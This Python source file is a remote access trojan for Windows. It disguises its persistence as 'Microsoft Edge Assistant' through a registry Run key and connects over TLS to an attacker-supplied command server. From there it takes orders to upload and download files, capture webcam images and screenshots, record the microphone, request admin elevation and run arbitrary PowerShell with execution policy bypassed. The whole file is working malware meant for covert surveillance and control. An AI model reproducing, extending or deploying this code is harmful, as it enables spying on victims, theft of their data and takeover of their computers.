import ssl
import socket
import subprocess
import json
import os
import cv2
from PIL import ImageGrab
import sounddevice as sd
import lameenc
import time as t
import sys
import ctypes
import tempfile
import shutil

class R_A_T:
    def __init__(self):
        self.go_persistence()
        self.connect = None
        self.buffer = b""
        # Embedded server certificate
        # Copy the entire content of server.crt including:
        # -----BEGIN CERTIFICATE----- and -----END CERTIFICATE-----
        self.SERVER_CERT = """-----BEGIN CERTIFICATE----- ..... -----END CERTIFICATE-----"""
        

    def go_persistence(self):
        persistence_path = os.environ["appdata"] + "\\Microsoft Edge Assistant.exe"
        if not os.path.exists(persistence_path):
            shutil.copyfile(sys.executable, persistence_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft Edge Assistant /t REG_SZ /d "' + persistence_path + '"', shell=True)


    def connect_once(self):
        # Establish TLS connection with embedded certificate
        SERVER_IP = #your_ip_here  (str)
        PORT = #your_port_here   (int)
        try:
            context = ssl.create_default_context()
            
            # Write certificate to temporary file
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.crt') as cert_file:
                cert_file.write(self.SERVER_CERT)
                cert_path = cert_file.name
            
            try:
                # Load certificate for verification
                context.load_verify_locations(cafile=cert_path)
                context.check_hostname = True
                context.verify_mode = ssl.CERT_REQUIRED
                
                # Create connection
                raw_socket = socket.create_connection((SERVER_IP, PORT), timeout=10) # for example: "10.0.0.1"
                self.connect = context.wrap_socket(raw_socket, server_hostname= SERVER_IP)
                self.connect.settimeout(None)
                
                return True
            finally:
                # Clean up temporary certificate file
                if os.path.exists(cert_path):
                    os.remove(cert_path)
                    
        except Exception as e:
            return False
        
    def recv_exact(self, size):
        data = b""
        while len(data) < size:
            chunk = self.connect.recv(size - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data

    def json_recv(self):
        try:
            while b"\n" not in self.buffer:
                chunk = self.connect.recv(4096)
                if not chunk:
                    raise ConnectionError("Connection lost")
                self.buffer += chunk
            message, sep, self.buffer = self.buffer.partition(b"\n")
            message = message.decode("utf-8", errors='ignore').strip()
            if not message:
                raise ValueError("Empty message")
            return json.loads(message)
        except json.JSONDecodeError as e:
            raise
        except Exception as e:
            raise

    def json_send(self, output):
        try:
            data = json.dumps(output) + "\n"
            self.connect.sendall(data.encode("utf-8"))
        except Exception as e:
            raise

    def change_path(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed to {path}"
        except Exception as e:
            return f"[-] Error: {e}"

    def unique_filename(self, filename):
        if not os.path.exists(filename):
            return filename
        name, ext = os.path.splitext(filename)
        i = 1
        while True:
            new_name = f"{name}_{i}{ext}"
            if not os.path.exists(new_name):
                return new_name
            i += 1

    def send_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                self.json_send(f"[-] File not found: {filepath}")
                return
            filesize = os.path.getsize(filepath)
            self.json_send("ready")           
            header = {"filename": os.path.basename(filepath), "size": filesize}
            header_json = json.dumps(header).encode("utf-8")
            self.connect.sendall(len(header_json).to_bytes(4, "big"))
            self.connect.sendall(header_json)            
            with open(filepath, "rb") as f:
                sent = 0
                while sent < filesize:
                    chunk = f.read(32768)
                    if not chunk:
                        break
                    self.connect.sendall(chunk)
                    sent += len(chunk)            
            ack = self.json_recv()
        except Exception as e:
            try:
                self.json_send(f"[-] Error: {e}")
            except:
                pass

    def recv_file(self):
        try:
            self.buffer = b""           
            header_len = int.from_bytes(self.recv_exact(4), "big")
            header_json = self.recv_exact(header_len)
            header = json.loads(header_json)
            filename = self.unique_filename(header["filename"])
            filesize = header["size"]
            with open(filename, "wb") as f:
                received = 0
                while received < filesize:
                    chunk_size = min(32768, filesize - received)
                    chunk = self.recv_exact(chunk_size)
                    f.write(chunk)
                    received += len(chunk)
            self.json_send("success")
        except Exception as e:
            try:
                self.json_send(f"[-] Error: {e}")
            except:
                pass

    def picture(self, camera):
        temp_file = "temp_pic.jpg"
        try:
            cap = cv2.VideoCapture(camera, cv2.CAP_DSHOW)
            if not cap.isOpened():
                cap.release()
                self.json_send("[-] Camera unavailable")
                return
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            ret, frame = cap.read()
            cap.release()
            if ret:
                cv2.imwrite(temp_file, frame)
                self.send_file(temp_file)
            else:
                self.json_send("[-] Capture failed")
        except Exception as e:
            try:
                self.json_send(f"[-] Error: {e}")
            except:
                pass
        finally:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass

    def capture_screen(self):
        temp_file = "temp_screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(temp_file)
            self.send_file(temp_file)
        except Exception as e:
            try:
                self.json_send(f"[-] Error: {e}")
            except:
                pass
        finally:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass

    def audio_record(self, duration):
        RATE = 44100
        CHANNELS = 1
        temp_file = "record.mp3"
        try:
            audio = sd.rec(int(int(duration) * RATE), samplerate=RATE, channels=CHANNELS, dtype='int16')
            sd.wait()
            # Encode to MP3
            encoder = lameenc.Encoder()
            encoder.set_bit_rate(192)
            encoder.set_in_sample_rate(RATE)
            encoder.set_channels(CHANNELS)
            encoder.set_quality(2)
            audio_bytes = audio.astype("int16").tobytes()
            mp3_data = encoder.encode(audio_bytes) + encoder.flush()
            with open(temp_file, "wb") as f:
                f.write(mp3_data)
            self.send_file(temp_file)
        except Exception as e:
            try:
                self.json_send(f"[-] Error: {e}")
            except:
                pass
        finally:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass

    def run_as_admin(self):
        # Check and request admin privileges
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        finally:
            self.json_send("[-] Failed to elevate privileges")
            pass

    def command_execution(self):
        try:
            command = self.json_recv()
            if not command or len(command) == 0:
                return True
            cmd = command[0]
            if cmd == "/exit":
                self.json_send("Exit OK")
                self.connect.close()
                sys.exit(0)
            
            elif cmd == "/quit":
                self.json_send("Quit OK")
                return False
            
            elif cmd == "cd":
                if len(command) > 1 and command[1]:
                    output = self.change_path(command[1])
                else:
                    output = os.getcwd()
                self.json_send(output)
            
            elif cmd == "download" and len(command) > 1:
                self.send_file(command[1])
            
            elif cmd == "upload":
                self.json_send("ready")
                self.recv_file()
            
            elif cmd == "image" and len(command) > 1:
                self.picture(int(command[1]))
            
            elif cmd == "screenshot":
                self.capture_screen()
            
            elif cmd == "audio" and len(command) > 1:
                self.audio_record(command[1])
            
            elif cmd == "/admin":
                self.run_as_admin()
            
            elif cmd == "shell" and len(command) > 1:
                try:
                    result = subprocess.run(
                        ["powershell", "-ExecutionPolicy", "Bypass", "-Command", command[1]], 
                        shell=False, capture_output=True, 
                        timeout=30, text=True)
                    output = result.stdout + result.stderr
                    if result.returncode == 0:
                        self.json_send(output if output.strip() else "[+] Done")
                    else:
                        self.json_send(f"[-] Error (exit code {result.returncode}):\n{output}")
                except subprocess.TimeoutExpired:
                    self.json_send("[-] Command timeout")
                except Exception as e:
                    self.json_send(f"[-] Error: {e}")
            else:
                self.json_send(f"[-] Unknown command: {cmd}")
            return True
        except ConnectionError:
            return False
        except Exception as e:
            return True

    def run(self):
        # Main loop
        while True:
            self.buffer = b""
            while True:
                if self.connect_once():
                    break
                t.sleep(5)
            try:
                while True:
                    if not self.command_execution():
                        break
            except KeyboardInterrupt:
                break
            except Exception as e:
                pass
            finally:
                try:
                    if self.connect:
                        self.connect.close()
                        self.connect = None
                except:
                    pass
                t.sleep(2)
try:
    if __name__ == "__main__":
        my_r_a_t = R_A_T()
        my_r_a_t.run()
except Exception as e:
    pass